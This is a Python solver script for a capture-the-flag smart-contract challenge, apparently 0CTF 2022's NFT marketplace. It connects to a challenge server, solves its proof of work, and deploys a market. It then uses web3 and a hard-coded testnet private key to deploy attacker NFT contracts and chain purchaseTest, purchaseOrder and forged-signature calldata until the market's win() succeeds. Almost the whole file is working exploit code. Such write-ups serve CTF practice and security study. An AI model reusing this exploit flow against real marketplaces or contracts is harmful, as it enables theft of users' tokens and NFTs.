import hashlib
import json

from pwn import *
from web3 import Web3


def solve_pow(prefix, difficulty):
    def is_valid(digest):
        zeros = '0' * difficulty
        if sys.version_info.major == 2:
            digest = [ord(i) for i in digest]
        bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
        return bits[-difficulty:] == zeros

    i = 0
    while True:
        i += 1
        ans = str(i).encode()
        s = prefix + ans
        if is_valid(hashlib.sha256(s).digest()):
            return ans


def connect():
    io = remote("47.102.40.39", 20000, level="DEBUG")

    io.recvuntil(b"(")
    prefix = io.recvuntil(b" ", drop=True)
    io.recvuntil(b"('")
    difficulty = len(io.recvuntil(b"')", drop=True))
    ans = solve_pow(prefix, difficulty)
    io.recv()
    io.sendline(ans)
    io.recv()
    return io


def deploy_market():
    io = connect()
    io.sendline(b"1")
    io.recvuntil(b"deployer account: ")
    deployer_address = io.recvline().strip()
    io.recvuntil(b"token: ")
    token = io.recvline().strip()
    print(f"{deployer_address=}")
    print(f"{token=}")

    input(f"Claim testnet ETH to {deployer_address.decode()} at http://47.102.40.39:8080/.\nPress ENTER once done.")

    while True:
        io = connect()
        io.sendline(b"2")
        io.recv()
        io.sendline(token)
        res = io.recv()
        if b"don't forget" in res:
            continue
        break

    market_address = res.decode().split("\n")[0].split(" ")[-1]
    print(f"{market_address=}")
    return token, market_address


def exploit(market_address):
    w3 = Web3(Web3.HTTPProvider('http://47.102.40.39:8545/'))

    # $ cast new wallet
    private_key = "0xb8305f5a0cacc7ade7f3aaa8702372307bdaaeb00e9447c85332284deec1477e"
    player_address = "0xe14924eC3FA63F8FD6f0937c3Fbcf86242dce2De"
    if w3.eth.get_balance(player_address) == 0:
        input(f"Claim testnet ETH to {player_address} at http://47.102.40.39:8080/.\nPress ENTER once done.")

    market_abi = json.load(open("out/Challenge.sol/TctfMarket.json"))["abi"]
    token_abi = json.load(open("out/Challenge.sol/TctfToken.json"))["abi"]
    nft_abi = json.load(open("out/Challenge.sol/TctfNFT.json"))["abi"]
    enft2_abi = json.load(open("out/Exploit.t.sol/ENFT2.json"))["abi"]
    enft2_bytecode = json.load(open("out/Exploit.t.sol/ENFT2.json"))["bytecode"]["object"]
    enft_abi = json.load(open("out/Exploit.t.sol/ENFT.json"))["abi"]
    enft_bytecode = json.load(open("out/Exploit.t.sol/ENFT.json"))["bytecode"]["object"]

    market = w3.eth.contract(address=market_address, abi=market_abi)
    while True:
        try:
            token_address = market.functions.tctfToken().call()
            nft_address = market.functions.tctfNFT().call()
            break
        except:
            pass

    print(f"{token_address=}")
    print(f"{nft_address=}")

    token = w3.eth.contract(address=token_address, abi=token_abi)
    nft = w3.eth.contract(address=nft_address, abi=nft_abi)

    chain_id = 21014
    gas_limit = 2000000

    def send(function):
        txn = function.build_transaction({'chainId': chain_id, 'gas': gas_limit, 'gasPrice': w3.toWei('1', 'gwei'), 'nonce': w3.eth.getTransactionCount(player_address), })
        signed_txn = w3.eth.account.sign_transaction(txn, private_key=private_key)
        w3.eth.send_raw_transaction(signed_txn.rawTransaction)
        tx_hash = w3.toHex(w3.keccak(signed_txn.rawTransaction))
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        assert tx_receipt["status"] == 1
        return tx_receipt

    send(token.functions.airdrop())
    send(token.functions.approve(market_address, (2**256) - 1))

    ENFT2 = w3.eth.contract(abi=enft2_abi, bytecode=enft2_bytecode)
    tx_receipt = send(ENFT2.constructor(market_address))
    enft2_address = tx_receipt["contractAddress"]
    enft2 = w3.eth.contract(address=enft2_address, abi=enft2_abi)

    send(enft2.functions.mint(market_address, 0))
    send(enft2.functions.mint(enft2_address, 1))
    send(token.functions.transfer(enft2_address, 1))
    send(market.functions.purchaseTest(enft2_address, 0, 1))
    send(enft2.functions.transferTctfToken())
    send(market.functions.purchaseOrder(1))

    ENFT = w3.eth.contract(abi=enft_abi, bytecode=enft_bytecode)
    tx_receipt = send(ENFT.constructor())
    enft_address = tx_receipt["contractAddress"]
    enft = w3.eth.contract(address=enft_address, abi=enft_abi)

    send(enft.functions.mint(player_address, 0))
    send(market.functions.createOrder(enft_address, 0, 1))
    send(market.functions.purchaseOrder(0))

    data = input(f"Change the ENFT address in the testSign function to {enft_address} and run `forge test -vv --match-path src/0CTF2022/TctfNftMarketplace/Exploit.t.sol --match-test testSign`.\nResult: ").strip()
    txn = {'value': 0, 'chainId': chain_id, 'gas': gas_limit, 'gasPrice': w3.toWei('1', 'gwei'), 'nonce': w3.eth.getTransactionCount(player_address), 'to': market_address, 'data': data}
    signed_txn = w3.eth.account.sign_transaction(txn, private_key=private_key)
    w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    tx_hash = w3.toHex(w3.keccak(signed_txn.rawTransaction))
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    assert tx_receipt["status"] == 1

    tx_receipt = send(market.functions.win())
    return tx_receipt["transactionHash"].hex()


def get_flag(token, tx_hash):
    io = connect()
    io.sendline(b"3")
    io.recv()
    io.sendline(token)
    io.recv()
    io.sendline(tx_hash.encode())
    io.recv()


def main():
    token, market_address = deploy_market()
    tx_hash = exploit(market_address)
    get_flag(token, tx_hash)


if __name__ == "__main__":
    main()